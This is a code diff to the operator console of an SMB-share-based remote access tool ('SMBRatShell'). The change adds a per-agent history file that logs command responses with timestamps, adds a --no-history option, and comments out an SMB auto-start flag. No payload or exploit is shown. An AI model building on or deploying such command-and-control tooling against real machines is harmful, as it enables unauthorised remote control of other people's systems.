@@ -14,7 +14,9 @@ OUTPUT_DAT = 'output.dat'
 PING_DAT = 'ping.dat'
 INFO_DAT = 'info.dat'
 CHECKIN_DAT = 'checkin.dat'
+HIST_DAT = 'hist.dat'
 Share = None
+No_history = False
 
 Sessions = dict()
 
@@ -118,13 +120,27 @@ class SessionHandler(FileSystemEventHandler) :
 			project, agent = event.src_path.split(os.sep)[-3:-1]
 			output_dat = get_output_path(project, agent)
 			with open(output_dat, 'r') as output_file:
+				response = output_file.read()
 				print ('''
 [<] Response from '{project}/{hostname}': 
 
 {response}
 ^^^^^^^^^^^^^^^^^^^^ {project}/{hostname} ^^^^^^^^^^^^^^^^^^^^
-					'''.format(project = project, hostname = agent, response =output_file.read())
+					'''.format(project = project,
+						hostname = agent,
+						response =response)
 					) 
+			if not No_history:
+				history_dat = get_path(agent, project, HIST_DAT)
+				# os.touch( history_dat )
+				# os.system("touch {}".format(history_dat))	# Dirty for file creation
+				with open(history_dat, 'a') as history_file:
+					history_file.write('''
+{response}
+		=========== {timestamp} ===========
+'''.format(response = response,
+		timestamp = time.ctime())
+			)
 
 
 class SMBRatShell(cmd.Cmd) :
@@ -288,12 +304,13 @@ if __name__ == '__main__' :
 	parser = argparse.ArgumentParser()
 
 	parser.add_argument('SHARE_PATH', help = 'Path to the directory that is used with the SMB Share')
+	parser.add_argument('--no-history', help = 'Disables storing the Command Outputs in a history file per Agent', action='store_true')
 	# parser.add_argument('--smb-auto-start', '-s', help = '''Uses impacket's "smbserver.py" to start an SMB Server with specified "ShareName"''',\
-	parser.add_argument('--smb-auto-start', '-s', help = '''Uses impacket's "smbserver.py" to start an SMB Server with specified "ShareName"''',\
-						default = False, action = 'store_true')
+						# default = False, action = 'store_true')
 
 	args = parser.parse_args()
-
+	# print (args)
+	No_history = args.no_history
 	share_folder = args.SHARE_PATH
 	initialize(share_folder)
 
